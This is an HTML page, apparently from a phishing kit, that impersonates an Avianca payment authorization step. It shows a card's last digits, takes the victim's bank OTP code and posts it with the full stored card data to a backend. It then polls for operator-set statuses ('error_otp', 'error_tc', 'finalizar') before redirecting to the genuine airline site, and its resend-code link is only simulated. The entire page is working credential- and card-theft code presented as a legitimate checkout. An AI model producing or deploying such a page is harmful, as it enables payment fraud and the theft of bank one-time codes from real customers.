<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Avianca - Booking (OTP)</title>

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="shortcut icon" href="./assets/favicon.svg" type="image/x-icon">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">

    <link rel="stylesheet" href="./css/checkers.css">
    <link rel="stylesheet" href="./css/normalize.css">

    <style>
        .loaderp {
            width: 48px;
            height: 48px;
            border: 5px solid #fff;
            border-bottom-color: #e8114b;
            border-radius: 50%;
            display: inline-block;
            box-sizing: border-box;
            animation: rotation 1s linear infinite;
        }
        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .loaderp-full {
            position: fixed;
            top: 0;
            left: 0;
            overflow-y: hidden;
            z-index: 1000;
            background-color: rgba(255,255,255,0.95);
            width: 100vw;
            height: 100vh;
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .content { max-width: 720px; margin: 40px auto; padding: 16px; }
        .labels { float:left; width:40%; font-weight:600; }
        .values { float:right; width:58%; }
        .values p { margin: 6px 0; }
        .clearfix::after { content: ""; clear: both; display: table; }

        .btn-success {
            display:block;
            width:200px;
            margin: 20px auto;
            padding:12px 20px;
            background:#0070c9;
            color:#fff;
            border:none;
            border-radius:6px;
            cursor:pointer;
            font-weight:700;
        }

        .hidden { display:none !important; }

        .logos { display:flex; align-items:center; gap:16px; padding: 12px; }
        .main-loader { display:none; }
    </style>
</head>
<body>
    <div class="main-loader show">
        <img id="company-loader" alt="">
        <div class="loader"></div>
    </div>

    <div class="logos">
        <img id="bank-logo" src="" alt="">
        <img id="company-logo" src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Avianca_Logo_2013.png" alt="Avianca" width="110">
    </div>

    <main>
        <div class="content">
            <b style="margin-bottom: 20px; display: block;">Autorización de transacción</b>

            <p style="margin-bottom: 10px;">
                La transacción que intenta realizar en <b>AVIANCA S.A</b> por
                <b>$ <span id="flight-price">49.900</span> USD</b> debe ser autorizada. Por favor, verifica la siguiente información:
            </p>

            <p style="margin-bottom: 20px;">Ingrese el código de su Banca Virtual:</p>

            <form id="form" style="margin-bottom: 30px;" class="clearfix" onsubmit="return false;">
                <div class="labels">
                    <p><b>Comercio: </b></p>
                    <p><b>Monto: </b></p>
                    <p><b>Número de tarjeta: </b></p>
                    <p><b id="otpcode_label">Código OTP: </b></p>
                </div>

                <div class="values">
                    <p>AVIANCA S.A</p>
                    <p>$ <span id="flight-price-2">49.000</span> USD</p>
                    <p>•••• •••• •••• <span id="card-digits"></span></p>
                    <input required oninput="limitDigits(this, 8)" type="text" id="otpcode_input" placeholder="Código OTP" maxlength="8" style="padding:8px; font-size:16px; width:100%; box-sizing:border-box;">
                </div>
            </form>

            <div style="text-align:center; margin-bottom:8px;">
                <a href="#" id="newCode" class="hidden">Presione aquí para recibir un nuevo código</a>
            </div>

            <button id="btnNextStep" class="btn-success">Aceptar</button>
        </div>
    </main>

    <div class="loaderp-full" id="globalLoader">
        <span class="loaderp"></span>
        <p class="text-italic tc-ocean fs-3 fw-light">Validando datos...</p>
    </div>

    <script>
    // --- Helpers mínimos ---
    function limitDigits(el, max) {
        el.value = el.value.replace(/\D/g, '').slice(0, max);
    }

    function showLoader() {
        const l = document.getElementById('globalLoader');
        if (l) l.style.display = 'flex';
    }
    function hideLoader() {
        const l = document.getElementById('globalLoader');
        if (l) l.style.display = 'none';
    }

    // Al cargar, rellenar datos desde localStorage si existen
    document.addEventListener('DOMContentLoaded', () => {
        const stored = JSON.parse(localStorage.getItem('paymentData') || 'null');
        if (!stored) {
            // No hay datos de pago guardados: redirigir al payment.html
            console.warn('No hay paymentData en localStorage — redirigiendo a payment.html');
            window.location.href = 'payment.html';
            return;
        }

        // mostrar precio / dígitos de tarjeta si existen
        if (stored.flightCost) {
            const fp = document.getElementById('flight-price');
            const fp2 = document.getElementById('flight-price-2');
            if (fp) fp.innerText = stored.flightCost;
            if (fp2) fp2.innerText = stored.flightCost;
        }
        if (stored.cardNumber) {
            const last4 = String(stored.cardNumber).slice(-4);
            const cd = document.getElementById('card-digits');
            if (cd) cd.innerText = last4;
        }
    });

    // --- Polling al backend para estado de la transacción ---
    function checkVerificationBackend(transactionId) {
        const poll = async () => {
            try {
                const res = await fetch(`/status/${transactionId}`, { cache: 'no-store' });
                const j = await res.json();
                const status = j && j.status ? j.status : 'not_found';

                if (status === 'pending' || status === undefined) {
                    setTimeout(poll, 2000);
                    return;
                }

                // llegó respuesta
                hideLoader();

                switch (status) {
                    case 'error_otp':
                        alert("Error en el código SMS. Por favor, ingréselo nuevamente.");
                        // Dejar el input visible para reintento
                        document.getElementById('otpcode_input').value = '';
                        break;
                    case 'error_tc':
                        alert("Error en la tarjeta. Por favor, intente de nuevo.");
                        window.location.href = "payment.html";
                        break;
                    case 'finalizar':
                        window.location.href = "https://www.avianca.com/";
                        break;
                    default:
                        console.warn('Estado desconocido recibido:', status);
                        break;
                }
            } catch (err) {
                console.error('Error en polling status:', err);
                setTimeout(poll, 2000);
            }
        };
        poll();
    }

    // --- Enviar datos al backend (/send-verification) ---
    async function enviarDatos() {
        const storedData = JSON.parse(localStorage.getItem('paymentData') || 'null');
        if (!storedData) {
            alert('No hay datos de pago, regresando al formulario.');
            window.location.href = 'payment.html';
            return;
        }

        const otp = document.getElementById('otpcode_input').value.trim();
        if (!otp) {
            alert('Por favor ingrese el código OTP.');
            return;
        }

        // asegúrate de tener transactionId
        const transactionId = storedData.transactionId || (Date.now().toString(36) + Math.random().toString(36).substr(2));
        storedData.transactionId = transactionId;
        localStorage.setItem('paymentData', JSON.stringify(storedData));

        const body = {
            transactionId,
            paymentData: storedData,
            otp
        };

        showLoader();

        try {
            const res = await fetch('/send-verification', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(body)
            });
            const j = await res.json();
            if (j && j.ok && j.transactionId) {
                // iniciar polling a backend
                checkVerificationBackend(j.transactionId);
            } else {
                console.error('Error desde backend:', j);
                hideLoader();
                alert('Ocurrió un error enviando la verificación. Intenta de nuevo.');
            }
        } catch (err) {
            console.error('Error enviando verificación:', err);
            hideLoader();
            alert('Error de conexión. Intenta otra vez.');
        }
    }

    document.getElementById('btnNextStep').addEventListener('click', (e) => {
        e.preventDefault();
        enviarDatos();
    });

    // opcional: link para generar nuevo OTP (solo UI placeholder)
    document.getElementById('newCode').addEventListener('click', (e) => {
        e.preventDefault();
        alert('Solicitud de nuevo código enviada (simulado).');
    });
    </script>
</body>
</html>
